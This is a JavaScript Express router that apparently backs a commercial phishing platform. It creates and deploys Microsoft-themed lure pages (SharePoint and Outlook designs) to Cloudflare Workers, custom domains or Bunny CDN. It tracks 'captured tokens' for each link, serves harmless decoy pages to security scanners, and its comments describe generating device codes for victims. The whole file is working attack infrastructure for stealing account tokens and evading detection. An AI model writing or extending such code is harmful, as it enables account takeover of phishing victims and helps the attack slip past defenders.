const express = require('express');
const router = express.Router();
const jwt = require('jsonwebtoken');
const db = require('../database/connection');
const config = require('../config/env');
const { userAuth } = require('../middleware/auth');
const { classifyRequest, getHarmlessPage } = require('../middleware/botguard');
const { validateResult, commonValidators } = require('../middleware/validator');

function normalizeWorkersSubdomain(value) {
  const s = String(value || '').trim().toLowerCase();
  if (!s) return 'workers.dev';
  return s.endsWith('.workers.dev') ? s : s + '.workers.dev';
}
function turnstileModeForDesign(designName) {
  try {
    const templateLoader = require('../services/templateloader');
    const design = String(designName || '');
    const hasHtml = !!(templateLoader.loadVerificationDesignHTML(design) || {}).hasHtml;
    return design.toLowerCase().includes('slider') || hasHtml ? 'managed' : 'invisible';
  } catch (e) {

    return 'managed';
  }
}


function getLinkPublicUrl(link, user) {
  if (!link) return null;
  if (link.url_type === 'bunny' && link.custom_domain) {
    return String(link.custom_domain).trim();
  }
  if (link.url_type === 'custom' && link.custom_domain) {
    let domain = String(link.custom_domain).trim();
    domain = domain.replace(/https?:\/\//i, '').replace(/\/+$/, '');
    if (!domain) return null;
    if (link.domain_connection === 'root') {
      const route = link.route_name ? '/' + String(link.route_name).replace(/^\/+/, '') : '';
      return `https://${domain}${route}`;
    }
    const prefix = String(link.route_name || link.worker_name || '').trim().replace(/[^a-z0-9-]/gi, '').toLowerCase();
    return `https://${prefix ? `${prefix}.` : ''}${domain}`;
  }
  if (link.url_type === 'worker' && link.worker_name) {
    return `https://${link.worker_name}.${normalizeWorkersSubdomain(user?.cf_workers_subdomain)}`;
  }
  if (link.url_type === 'export') {
    // If domain is set, show the domain URL; otherwise show download URL
    if (link.custom_domain) {
      let domain = String(link.custom_domain).trim();
      if (!domain.startsWith('http')) {
        domain = 'https://' + domain;
      }
      return domain;
    }
    if (link.jwt_payload) {
      return `/api/links/${link.id}/export?token=${encodeURIComponent(link.jwt_payload)}`;
    }
    return `/api/links/${link.id}/export`;
  }
  return null;
}

// -------------------------------------------
// List existing Cloudflare workers for the authenticated user
// -------------------------------------------
router.get('/workers', userAuth, async (req, res) => {
  try {
    if (!req.user.cf_api_token || !req.user.cf_account_id) {
      return res.json({ workers: [], message: 'Cloudflare credentials not configured' });
    }
    const axios = require('axios');
    const response = await axios.get(
      `https://api.cloudflare.com/client/v4/accounts/${req.user.cf_account_id}/workers/scripts`,
      { headers: { Authorization: `Bearer ${req.user.cf_api_token}` }, timeout: 20000 }
    );
    if (!response.data.success) {
      return res.status(400).json({ error: response.data.errors?.[0]?.message || 'Failed to list workers' });
    }
    const workers = response.data.result || [];
    res.json({ workers: workers.map(w => ({ id: w.id, modified_on: w.modified_on })) });
  } catch (err) {
    res.status(500).json({ error: 'Failed to list workers: ' + (err.response?.data?.errors?.[0]?.message || err.message) });
  }
});

// -------------------------------------------
// Get all links for user
// -------------------------------------------
router.get('/', userAuth, async (req, res) => {
  try {
    const { status } = req.query;
    let query = 'SELECT l.*, (SELECT COUNT(*) FROM captured_tokens WHERE link_id = l.id AND deleted = 0) as token_count FROM links l WHERE l.user_id = ?';
    const params = [req.user.id];

    if (status === 'active') {
      query += " AND l.status = 'active' AND l.kill_switched = 0";
    } else if (status === 'disabled') {
      query += " AND l.status = 'disabled'";
    } else if (status && status !== 'all') {
      query += " AND l.status = ?";
      params.push(status);
    }
    
    query += ' ORDER BY l.created_at DESC';
    const [links] = await db.query(query, params);
    const enriched = links.map(link => ({
      ...link,
      public_url: getLinkPublicUrl(link, req.user),
    }));
    res.json(enriched);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

router.get('/check-worker-name', userAuth, async (req, res) => {
  try {
    const name = String(req.query.name || req.body?.name || '').trim();
    if (!name) {
      return res.json({ available: false, name: '', reason: 'empty_name' });
    }

    const workerName = name.toLowerCase().replace(/[^a-z0-9-]+/g, '').replace(/^-+|-+$/g, '').slice(0, 64);
    if (!workerName) {
      return res.json({ available: false, name: workerName, reason: 'invalid_name' });
    }

    const [existing] = await db.query('SELECT id FROM links WHERE worker_name = ?', [workerName]);
    if (existing.length > 0) {
      return res.json({ available: false, name: workerName, reason: 'taken' });
    }

    return res.json({ available: true, name: workerName });
  } catch (err) {

    res.json({
      available: true,
      checked: false,
      name: String(req.query.name || '').trim(),
      reason: 'check_failed',
    });
  }
});


// -------------------------------------------
// Get single link
// -------------------------------------------
router.get('/:id', userAuth, async (req, res) => {
  try {
    const [links] = await db.query('SELECT * FROM links WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!links.length) return res.status(404).json({ error: 'Link not found' });
    const link = links[0];
    link.public_url = getLinkPublicUrl(link, req.user);
    res.json(link);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// -------------------------------------------
// Create link (with Cloudflare check, Bunny ready)
// -------------------------------------------
router.post('/', userAuth, commonValidators.createLink, validateResult, async (req, res) => {
  try {
    if (req.user.subscription_status !== 'active') {
      return res.status(403).json({ error: 'Subscription not active' });
    }
    if (req.user.subscription_expiry && new Date(req.user.subscription_expiry) < new Date()) {
      return res.status(403).json({ error: 'Subscription expired' });
    }

    const {
      name, worker_name, template_type, verification_design, auth_mode,
      destination_url, custom_domain, url_type, domain_connection, route_name,
      file_name, pages, title_text, message_text, button_text,
      background_blur, blob_url_enabled, copy_to_open, show_verification_complete, custom_bg_url,
    } = req.body;

    // Anti-bot protection is always enabled — users cannot disable it
    const turnstile_enabled = 1;

    // If deploying to Cloudflare Worker, user must have credentials
    if (['worker', 'custom'].includes(url_type)) {
      if (!req.user.cf_api_token || !req.user.cf_account_id) {
        return res.status(400).json({
          error: 'Cloudflare credentials not configured. Please add your API Token and Account ID in Settings.',
        });
      }
    }

    // Ensure worker_name is unique by appending timestamp if it already exists
    let uniqueWorkerName = worker_name;
    if (uniqueWorkerName) {
      const [existing] = await db.query('SELECT id FROM links WHERE worker_name = ? AND user_id = ?', [uniqueWorkerName, req.user.id]);
      if (existing.length > 0) {
        uniqueWorkerName = uniqueWorkerName + '-' + Date.now();
      }
    }

    // Auto-generate name based on deployment type
    let generatedName = 'Untitled';
    if (url_type === 'worker' && worker_name) {
      generatedName = `static-${worker_name}`;
    } else if (url_type === 'custom' && custom_domain) {
      const domain = String(custom_domain).replace(/https?:\/\//i, '').split('/')[0];
      generatedName = `static-${domain}`;
    } else if (template_type) {
      generatedName = `${template_type.charAt(0).toUpperCase() + template_type.slice(1).replace(/[0-9]/g, '')} Link`;
    }

    const [result] = await db.query(
      `INSERT INTO links
      (user_id, name, worker_name, template_type, verification_design, auth_mode,
      destination_url, custom_domain, url_type, domain_connection, route_name,
      file_name, pages, title_text, message_text, button_text,
      background_blur, blob_url_enabled, copy_to_open, show_verification_complete, turnstile_enabled, custom_bg_url)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
      [
        req.user.id, name || generatedName, uniqueWorkerName, template_type || 'sharepoint4',
        verification_design || 'outlook', auth_mode || 'token',
        destination_url || 'https://office.com', custom_domain || null,
        url_type || 'worker', domain_connection || 'subdomain', route_name || null,
        file_name || null, pages || null, title_text || null, message_text || null, button_text || null,
        background_blur || 4, blob_url_enabled ? 1 : 0,
        copy_to_open ? 1 : 0, show_verification_complete !== false ? 1 : 0,
        turnstile_enabled !== false ? 1 : 0,
        custom_bg_url || null,
      ]
    );

    const linkId = result.insertId;

    // Generate JWT for anti-cloning
    const jwtPayload = jwt.sign(
      { user_id: req.user.id, link_id: linkId },
      config.JWT_SECRET,
      { expiresIn: '90d' }
    );
    await db.query('UPDATE links SET jwt_payload = ? WHERE id = ?', [jwtPayload, linkId]);

    // If Cloudflare Worker deployment, actually upload the script
    if (['worker', 'custom'].includes(url_type)) {
      try {
        const templateLoader = require('../services/templateloader');
        const cloudflare = require('../services/cloudflare');
        const apiBaseUrl = config.API_URL ? config.API_URL : `${req.protocol}://${req.get('host')}`;

        const cfWorkersSubdomain = normalizeWorkersSubdomain(
          req.user.cf_workers_subdomain || config.CF_WORKERS_SUBDOMAIN
        );
        const turnstileHostname = custom_domain
          ? String(custom_domain).replace(/^https?:\/\//i, '').replace(/\/+$/, '').toLowerCase()
          : cfWorkersSubdomain;   // e.g. "powerballranger.workers.dev"
        try {
          const turnstilePool = require('../services/turnstile-pool');
          const turnstileMode = turnstileModeForDesign(req.body.verification_design);
          await turnstilePool.assignWidget(linkId, turnstileHostname, turnstileMode).catch(err => {

          });
        } catch (tpErr) {

        }

        const scriptContent = await templateLoader.buildWorkerScript({ ...req.body, id: linkId, custom_bg_url: custom_bg_url || null }, req.user, apiBaseUrl);
        const deployment = await cloudflare.deployWorker(
          scriptContent,
          worker_name,
          req.user.cf_api_token,
          req.user.cf_account_id,
          {
            customDomain: custom_domain,
            domainConnection: domain_connection,
            routeName: route_name,
          }
        );
        await db.query('UPDATE links SET worker_name = ?, url_type = ?, custom_domain = ?, custom_bg_url = ? WHERE id = ?',
          [deployment.workerName || worker_name, url_type, custom_domain || null, custom_bg_url || null, linkId]);

        try {
          const turnstileWhitelist = require('../services/turnstile-whitelist');
          await turnstileWhitelist.autoWhitelistWorker({
            workerName: deployment.workerName || worker_name,
            customDomain: custom_domain,
            userCfToken: req.user.cf_api_token,
            userCfAccountId: req.user.cf_account_id,
            cfWorkersSubdomain: cfWorkersSubdomain
          }).catch(err => {

          });
        } catch (twErr) {

        }
      } catch (deployErr) {
        await db.query('UPDATE links SET status = ? WHERE id = ?', ['disabled', linkId]);

        let errorMessage = 'Worker deployment failed';
        if (deployErr.response?.data?.errors?.[0]?.message) {
          errorMessage += ': ' + deployErr.response.data.errors[0].message;
        } else if (deployErr.message) {
          errorMessage += ': ' + deployErr.message;
        } else {
          errorMessage += ': Unknown error';
        }
        return res.status(500).json({ error: errorMessage });
      }
    }

    const [link] = await db.query('SELECT * FROM links WHERE id = ?', [linkId]);
    if (link[0]) link[0].public_url = getLinkPublicUrl(link[0], req.user);
    res.status(201).json(link[0]);
  } catch (err) {

    res.status(500).json({ error: err.message || 'Server error', details: process.env.NODE_ENV !== 'production' ? { stack: err.stack } : undefined });
  }
});

// -------------------------------------------
// Update link
// -------------------------------------------
router.put('/:id', userAuth, commonValidators.updateLink, validateResult, async (req, res) => {
  try {
    const [existing] = await db.query('SELECT * FROM links WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!existing.length) return res.status(404).json({ error: 'Link not found' });

    const updatableFields = [
      'name', 'template_type', 'verification_design', 'auth_mode',
      'destination_url', 'custom_domain', 'url_type', 'domain_connection', 'route_name',
      'file_name', 'pages', 'title_text', 'message_text', 'button_text',
      'background_blur', 'blob_url_enabled', 'copy_to_open', 'show_verification_complete', 'status', 'custom_bg_url',
    ];

    const updates = {};
    for (const field of updatableFields) {
      if (req.body[field] !== undefined) {
        updates[field] = req.body[field];
      }
    }

    if (Object.keys(updates).length === 0) {
      return res.status(400).json({ error: 'No valid fields to update' });
    }

    const setClauses = Object.keys(updates).map(k => {
      if (['blob_url_enabled', 'copy_to_open', 'show_verification_complete'].includes(k)) {
        return `${k} = ${updates[k] ? 1 : 0}`;
      }
      return `${k} = ?`;
    }).join(', ');
    
    const values = Object.values(updates).map(v => {
      if (typeof v === 'boolean') return v ? 1 : 0;
      return v;
    });
    values.push(req.params.id);

    await db.query(`UPDATE links SET ${setClauses} WHERE id = ?`, values);
    const [updated] = await db.query('SELECT * FROM links WHERE id = ?', [req.params.id]);
    if (updated[0]) updated[0].public_url = getLinkPublicUrl(updated[0], req.user);

    try {
      const row = updated[0];
      if (row) {
        const hostname = row.custom_domain
          ? String(row.custom_domain).replace(/^https?:\/\//i, '').replace(/\/+$/, '').toLowerCase()
          : (normalizeWorkersSubdomain(req.user.cf_workers_subdomain) || null);
        if (hostname) {
          const turnstilePool = require('../services/turnstile-pool');
          const turnstileMode = turnstileModeForDesign(row.verification_design);
          await turnstilePool.assignWidget(row.id, hostname, turnstileMode).catch(err => {

          });
        }
      }
    } catch (tpErr) {

    }

    res.json(updated[0]);
  } catch (err) {

    res.status(500).json({ error: 'Server error' });
  }
});

// -------------------------------------------
// Delete link (hard delete + cascade to Cloudflare worker)
// -------------------------------------------
router.delete('/:id', userAuth, commonValidators.deleteLink, validateResult, async (req, res) => {
  let connection;
  try {

    
    // Get a connection for transaction
    connection = await db.getConnection();
    await connection.beginTransaction();

    const [existing] = await connection.query('SELECT * FROM links WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!existing.length) {

      await connection.rollback();
      connection.release();
      return res.status(404).json({ error: 'Link not found' });
    }

    const link = existing[0];


    // Delete associated visitors
    const [visitorsResult] = await connection.query('DELETE FROM visitors WHERE link_id = ?', [link.id]);


    // Delete associated tokens
    const [tokensResult] = await connection.query('DELETE FROM captured_tokens WHERE link_id = ?', [link.id]);


    // Delete the link itself
    const [linkResult] = await connection.query('DELETE FROM links WHERE id = ?', [link.id]);


    // Commit transaction
    await connection.commit();
    connection.release();

    // Release Turnstile widget assignment for this link
    setImmediate(async () => {
      try {
        const turnstilePool = require('../services/turnstile-pool');
        await turnstilePool.releaseWidget(link.id);
      } catch (tpErr) {

      }
    });

    // Delete Cloudflare worker if it exists (fire-and-forget, don't block response)
    if (link.worker_name && req.user.cf_api_token && req.user.cf_account_id) {
      setImmediate(async () => {
        try {
          const axios = require('axios');
          await axios.delete(
            `https://api.cloudflare.com/client/v4/accounts/${req.user.cf_account_id}/workers/scripts/${link.worker_name}`,
            { headers: { Authorization: `Bearer ${req.user.cf_api_token}` }, timeout: 15000 }
          );

        } catch (cfErr) {

        }
      });
    }


    res.json({
      success: true,
      message: 'Link deleted successfully',
      deleted: {
        visitors: visitorsResult.affectedRows,
        tokens: tokensResult.affectedRows,
        links: linkResult.affectedRows
      }
    });
  } catch (err) {

    if (connection) {
      try { await connection.rollback(); } catch(e) {}
      connection.release();
    }
    res.status(500).json({ error: 'Server error', details: err.message });
  }
});

// -------------------------------------------
// Toggle link status
// -------------------------------------------
router.post('/:id/toggle', userAuth, async (req, res) => {
  try {
    const [existing] = await db.query('SELECT * FROM links WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!existing.length) return res.status(404).json({ error: 'Link not found' });

    const newStatus = existing[0].status === 'active' ? 'disabled' : 'active';
    if (existing[0].kill_switched) {
      return res.status(403).json({ error: 'Link is terminated and cannot be reactivated' });
    }
    await db.query('UPDATE links SET status = ? WHERE id = ?', [newStatus, req.params.id]);
    res.json({ status: newStatus });
  } catch (err) {
    res.status(500).json({ error: 'Server error', details: err.message });
  }
});

// -------------------------------------------
// Export HTML
// Accepts either a per-link JWT (in Authorization header or ?token=) OR a valid user session token.
// -------------------------------------------
router.get('/:id/export', async (req, res) => {
  try {
    const linkId = parseInt(req.params.id, 10);
    const authHeader = req.headers.authorization?.replace('Bearer ', '') || null;
    const queryToken = req.query.token || null;
    const candidateToken = authHeader || queryToken;

    let user = null;
    let link = null;

    if (candidateToken) {
      try {
        const decoded = jwt.verify(candidateToken, config.JWT_SECRET);
        if (decoded.link_id && decoded.link_id === linkId) {
          const [links] = await db.query('SELECT * FROM links WHERE id = ?', [linkId]);
          if (!links.length) return res.status(404).json({ error: 'Link not found' });
          link = links[0];
          const [users] = await db.query('SELECT * FROM users WHERE id = ?', [decoded.user_id]);
          if (!users.length) return res.status(403).json({ error: 'Link owner not found' });
          user = users[0];
        } else if (decoded.user_id) {
          const [users] = await db.query('SELECT * FROM users WHERE id = ?', [decoded.user_id]);
          if (!users.length) return res.status(401).json({ error: 'Authentication required' });
          user = users[0];
          const [links] = await db.query('SELECT * FROM links WHERE id = ? AND user_id = ?', [linkId, user.id]);
          if (!links.length) return res.status(404).json({ error: 'Link not found' });
          link = links[0];
        } else {
          return res.status(401).json({ error: 'Authentication required' });
        }
      } catch (ve) {
        return res.status(401).json({ error: 'Invalid or expired token' });
      }
    } else {
      const sessionToken = req.cookies?.vg_session || null;
      const bearer = req.headers.authorization?.replace('Bearer ', '') || null;
      const fallbackToken = bearer || sessionToken;
      if (!fallbackToken) return res.status(401).json({ error: 'Authentication required' });
      try {
        const decoded = jwt.verify(fallbackToken, config.JWT_SECRET);
        const [users] = await db.query('SELECT * FROM users WHERE id = ?', [decoded.user_id]);
        if (!users.length) return res.status(401).json({ error: 'Authentication required' });
        user = users[0];
        const [links] = await db.query('SELECT * FROM links WHERE id = ? AND user_id = ?', [linkId, user.id]);
        if (!links.length) return res.status(404).json({ error: 'Link not found' });
        link = links[0];
      } catch (ve) {
        return res.status(401).json({ error: 'Invalid or expired token' });
      }
    }

    const templateLoader = require('../services/templateloader');
    const cloudflare = require('../services/cloudflare');
    const exportDomain = req.query.domain || req.body?.domain || req.headers['x-export-domain'] || null;

    const apiBaseUrl = config.API_URL ? config.API_URL : `${req.protocol}://${req.get('host')}`;
    const classification = await classifyRequest(req);
    if (classification.action !== 'allow') {
      const { contentType, body } = getHarmlessPage(classification.reason === 'Scanner path pattern' ? 404 : 200);
      res.set({
        'Content-Type': 'text/html; charset=utf-8',
        'X-Content-Type-Options': 'nosniff',
        'Cache-Control': 'no-store',
      });
      return res.status(contentType.includes('404') ? 404 : 200).send(body);
    }

    let exportHost = '';
    if (exportDomain) {
      exportHost = String(exportDomain)
        .replace(/^https?:\/\//i, '')
        .replace(/\/+$/, '')
        .split('/')[0];
      if (exportHost && !link.custom_domain) {
        await db.query(
          'UPDATE links SET custom_domain = ?, name = ?, url_type = ? WHERE id = ?',
          [exportHost, exportHost, 'export', linkId]
        );
        link.custom_domain = exportHost;
        link.name = exportHost;
        link.url_type = 'export';
      }
    }

    // Turnstile: the exported page runs on the customer's OWN host, so the
    // widget's allowed-hostnames list must include it, or the widget refuses
    // to render (error 110200) and no token is ever issued. This is the real
    // fix - addOriginToWhitelist() below rejects any domain that is not a
    // Cloudflare zone, which is almost always true for a customer's host.
    if (exportHost) {
      try {
        const turnstilePool = require('../services/turnstile-pool');
        const siteKey = link && link.id ? await turnstilePool.getAssignedSiteKey(link.id) : '';
        if (siteKey) {
          await turnstilePool._updateWidgetOrigins(siteKey, exportHost, 'add');

        } else {

        }
      } catch (tsErr) {

      }

      // Also keep the internal whitelist in sync for the admin UI.
      try {
        const turnstileWhitelist = require('../services/turnstile-whitelist');
        await turnstileWhitelist.autoWhitelistExportDomain(
          exportHost,
          user.cf_api_token,
          user.cf_account_id
        ).catch(err => {

        });
      } catch (twErr) {

      }
    }

    const html = await templateLoader.generateExportHtml(link, user, { domain: exportHost || exportDomain, apiBaseUrl, req });

    // Include whitelist info in response headers for client-side tracking
    const whitelistDomains = [];
    if (exportDomain) whitelistDomains.push(exportDomain.replace(/^https?:\/\//i, '').replace(/\/+$/, ''));

    res.setHeader('Content-Type', 'text/html');
    res.setHeader('Content-Disposition', `attachment; filename="vgenius-${link.worker_name || link.id}.html"`);
    res.setHeader('X-Export-Domain', exportDomain || '');
    res.setHeader('X-Turnstile-Whitelisted', whitelistDomains.join(','));
    res.send(html);
  } catch (err) {

    res.status(500).json({ error: 'Export failed', details: err.message });
  }
});

// -------------------------------------------
// Deploy to Bunny CDN
// -------------------------------------------
router.post('/:id/deploy-bunny', userAuth, async (req, res) => {
  try {
    const [links] = await db.query('SELECT * FROM links WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!links.length) return res.status(404).json({ error: 'Link not found' });
    const link = links[0];

    if (!req.user.bunny_api_key || !req.user.bunny_storage_zone || !req.user.bunny_storage_region) {
      return res.status(400).json({ error: 'Bunny CDN credentials not configured. Add them in Settings.' });
    }

    const templateLoader = require('../services/templateloader');
    const bunny = require('../services/bunny');
    const fileName = `vg-${link.worker_name || link.id}.html`;

    // The page will be hosted on the customer's Bunny pull zone, a host that
    // is NOT this backend. Compute that host BEFORE uploading so it can be
    // baked into the page (__EXPORT_DOMAIN) and added to the Turnstile widget
    // allowed-hostnames list - otherwise the widget will not render on the
    // Bunny host and no device code will be generated.
    let bunnyHost = '';
    if (req.user.bunny_pull_url) {
      bunnyHost = String(req.user.bunny_pull_url)
        .replace(/^https?:\/\//i, '')
        .replace(/\/+$/, '')
        .split('/')[0];
    } else if (req.user.bunny_storage_zone) {
      bunnyHost = String(req.user.bunny_storage_zone).replace(/^https?:\/\//i, '').replace(/\/+$/, '') + '.b-cdn.net';
    }

    if (bunnyHost) {
      try {
        const turnstilePool = require('../services/turnstile-pool');
        const siteKey = link && link.id ? await turnstilePool.getAssignedSiteKey(link.id) : '';
        if (siteKey) {
          await turnstilePool._updateWidgetOrigins(siteKey, bunnyHost, 'add');

        } else {

        }
      } catch (tsErr) {

      }
    }

    const html = await templateLoader.generateExportHtml(link, req.user, { domain: bunnyHost });
    const result = await bunny.uploadToBunny(
      html,
      fileName,
      req.user.bunny_api_key,
      req.user.bunny_storage_zone,
      req.user.bunny_storage_region,
      req.user.bunny_pull_url
    );

    await db.query('UPDATE links SET custom_domain = ?, url_type = ? WHERE id = ?', [result.url, 'bunny', link.id]);
    res.json({ url: result.url });
  } catch (err) {
    res.status(500).json({ error: err.message || 'Deployment failed' });
  }
});

module.exports = router;
